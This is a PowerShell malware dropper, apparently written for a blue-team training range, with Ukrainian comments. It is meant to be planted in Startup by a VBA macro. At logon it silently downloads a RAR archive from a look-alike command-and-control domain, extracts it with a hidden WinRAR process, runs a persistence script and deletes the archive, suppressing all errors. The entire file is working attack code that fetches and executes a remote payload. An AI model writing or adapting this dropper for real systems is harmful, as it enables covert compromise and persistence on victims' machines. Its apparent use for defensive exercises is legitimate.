# =============================================================================
#  implant.ps1 — Initial Dropper
#  для навчання — заборонено використовувати поза навчальним середовищем
#  EXERCISE ONLY — CyberRanges blue team training
# =============================================================================
# Потрапляє в Startup через VBA macro (block7).
# При логоні жертви:
#   1. Завантажує implant.rar з C2 HTTP сервера
#   2. Знаходить WinRAR → розпаковує в %TEMP%\wupd\
#   3. Запускає block1_persist.ps1
# =============================================================================

$ErrorActionPreference = "SilentlyContinue"

$C2_URL  = "http://updates-gov.net/implant.rar"
$RAR_DST = "$env:TEMP\implant.rar"
$OUT_DIR = "$env:TEMP\wupd"

# ── 1. Завантажити архів ──────────────────────────────────────────────────────
try {
    Invoke-WebRequest -Uri $C2_URL -OutFile $RAR_DST -UseBasicParsing -TimeoutSec 30
} catch {}

if (-not (Test-Path $RAR_DST)) { exit }

# ── 2. Знайти WinRAR ──────────────────────────────────────────────────────────
$winrar = $null
@(
    "C:\Program Files\WinRAR\WinRAR.exe",
    "C:\Program Files (x86)\WinRAR\WinRAR.exe"
) | ForEach-Object {
    if (-not $winrar -and (Test-Path $_)) { $winrar = $_ }
}

if (-not $winrar) { exit }

# ── 3. Розпакувати ────────────────────────────────────────────────────────────
if (Test-Path $OUT_DIR) {
    Remove-Item $OUT_DIR -Recurse -Force -ErrorAction SilentlyContinue
}
New-Item -Path $OUT_DIR -ItemType Directory -Force | Out-Null

# x = extract, -ibck = silent, -o+ = overwrite, -inul = no output
$proc = Start-Process -FilePath $winrar `
    -ArgumentList "x -ibck -o+ -inul `"$RAR_DST`" `"$OUT_DIR\`"" `
    -Wait -PassThru -WindowStyle Hidden

if ($proc.ExitCode -ne 0) { exit }

# ── 4. Запустити block1 ───────────────────────────────────────────────────────
$b1 = Join-Path $OUT_DIR "block1_persist.ps1"
if (Test-Path $b1) {
    & $b1
}

# ── 5. Прибрати архів ─────────────────────────────────────────────────────────
Remove-Item $RAR_DST -Force -ErrorAction SilentlyContinue
